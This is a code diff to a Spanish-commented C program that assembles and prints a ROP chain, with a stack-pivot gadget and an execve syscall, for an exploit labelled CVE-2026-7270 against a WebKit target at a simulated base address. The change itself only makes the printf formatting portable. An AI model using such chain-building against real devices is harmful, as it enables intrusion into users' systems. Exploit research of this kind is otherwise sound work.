@@ -11,7 +11,7 @@
  */
 
 #include <stdio.h>
-#include <stdint.h>
+#include <inttypes.h>
 #include <stdlib.h>
 #include <string.h>
 #include <assert.h>
@@ -90,8 +90,8 @@ int main(void) {
     rop_init(&chain, FAKE_WK_BASE);
 
     printf("[1] Verificando Gadget de Stack Pivot:\n");
-    printf("    xchg rax, rsp; ret => 0x%016llx (Offset: 0x%llx)\n",
-           FAKE_WK_BASE + GADGET_XCHG_RAX_RSP_RET, GADGET_XCHG_RAX_RSP_RET);
+    printf("    xchg rax, rsp; ret => 0x%016" PRIx64 " (Offset: 0x%" PRIx64 ")\n",
+           (uint64_t)(FAKE_WK_BASE + GADGET_XCHG_RAX_RSP_RET), (uint64_t)GADGET_XCHG_RAX_RSP_RET);
 
     // Construcción de invocación a Syscall 59 (execve) para CVE-2026-7270
     // arg1 = path ("/system/common/lib/libSceSysCore.sprx")
@@ -123,10 +123,10 @@ int main(void) {
     for (size_t i = 0; i < chain.count; i++) {
         uint64_t val = chain.entries[i];
         if (val >= FAKE_WK_BASE && val < FAKE_WK_BASE + 0x10000000ULL) {
-            printf("    [%02zu] 0x%016llx  <WebKit Gadget +0x%llx>\n",
-                   i, val, val - FAKE_WK_BASE);
+            printf("    [%02zu] 0x%016" PRIx64 "  <WebKit Gadget +0x%" PRIx64 ">\n",
+                   i, val, (uint64_t)(val - FAKE_WK_BASE));
         } else {
-            printf("    [%02zu] 0x%016llx  <Inmediate/Argument Data>\n", i, val);
+            printf("    [%02zu] 0x%016" PRIx64 "  <Inmediate/Argument Data>\n", i, val);
         }
     }
 
